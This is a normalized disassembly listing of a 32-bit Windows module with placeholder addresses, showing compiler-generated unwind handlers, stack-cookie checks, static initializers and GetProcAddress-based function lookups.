sub_1004fa88
lea ecx [ ebp - 0x4c ]
jmp sub_10012639
sub_1004fa90
lea ecx [ ebp - 0x30 ]
jmp sub_10012639
sub_1004fa98
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004fab3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004face
lea ecx [ ebp - 0x30 ]
jmp sub_10012639
sub_1004fad6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004fafb
lea edi [ ebp - 0x120 ]
jmp sub_1000211e
sub_1004fb06
lea ecx [ ebp - 0x164 ]
jmp sub_1000206b
sub_1004fb11
push [ ebp - 0x168 ]
call sub_100242e6
pop ecx
retn
sub_1004fb1e
mov eax [ ebp - 0x170 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x170 ] 0xfffffffe
lea ecx [ ebp - 0x164 ]
jmp sub_10012639
sub_1004fb40
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x174 ]
mov ecx [ edx - 0x178 ]
xor ecx eax
call sub_100242d7
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004fb6e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004fb89
lea ecx [ ebp ]
jmp sub_10011476
sub_1004fb91
lea eax [ ebp - 0x34 ]
push eax
call sub_1000dd28
retn
sub_1004fb9b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx + 0x114 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004fbc3
call sub_1003db5a
mov [ rw-data ] eax
retn
sub_1004fbce
call sub_1003db5a
mov [ rw-data ] eax
retn
sub_1004fbd9
call sub_1003db19
mov [ rw-data ] eax
retn
sub_1004fbe4
call sub_1003db5a
mov [ rw-data ] eax
retn
sub_1004fbef
call sub_1003db5a
mov [ rw-data ] eax
retn
sub_1004fbfa
call sub_1003db19
mov [ rw-data ] eax
retn
sub_1004fc49
mov ecx rw-data
call sub_10023062
push sub_1004fd59
call sub_10028434
pop ecx
retn
sub_1004fc5f
push sub_1004fd63
call sub_10028434
pop ecx
retn
sub_1004fc6b
mov ecx rw-data
call sub_10023062
push sub_1004fd6d
call sub_10028434
pop ecx
retn
sub_1004fc81
push sub_1004fd77
call sub_10028434
pop ecx
retn
sub_1004fc8d
push sub_1004fd95
call sub_10028434
pop ecx
retn
sub_1004fc99
call sub_1003db19
mov [ rw-data ] eax
retn
sub_1004fca4
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_1004fcc1
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_1004fcde
call sub_1003db19
mov [ rw-data ] 0x3
mov [ rw-data ] eax
retn
sub_1004fcf3
push 0x0
push r--data
mov ecx rw-data
call sub_1003d5c1
push sub_1004fdbe
call sub_10028434
pop ecx
retn
sub_1004fd10
push 0x0
push r--data
mov ecx rw-data
call sub_1003d5c1
push sub_1004fdaf
call sub_10028434
pop ecx
retn
sub_1004fd2d
call sub_1003db5a
mov [ rw-data ] eax
retn
sub_1004fd38
call sub_1003db5a
mov [ rw-data ] eax
retn
sub_1004fd43
call sub_1003db19
mov [ rw-data ] eax
retn
sub_1004fd4e
call sub_1003db19
mov [ rw-data ] eax
retn
sub_1004fd59
mov ecx rw-data
jmp sub_10023093
sub_1004fd63
mov ecx rw-data
jmp sub_10003c49
sub_1004fd6d
mov ecx rw-data
jmp sub_10023093
sub_1004fd77
mov ecx rw-data
jmp sub_100242b2
sub_1004fd81
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_100244cc
sub_1004fd95
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
retn
jmp sub_10003d5c
sub_1004fda5
mov ecx rw-data
jmp sub_10003c49
sub_1004fdaf
push 0x0
push 0x1
mov ecx rw-data
call sub_10001500
retn
sub_1004fdbe
push 0x0
push 0x1
mov ecx rw-data
call sub_10001500
retn
sub_1004fdcd
mov [ rw-data ] r--data
retn
sub_1004fdd8
mov [ rw-data ] r--data
retn
sub_1004fde3
mov [ rw-data ] r--data
retn
sub_1004fdee
push 0x0
push 0x1
mov ecx rw-data
call sub_10002020
retn
sub_1004fdfd
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_100244cc
sub_1004fe11
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_100244cc
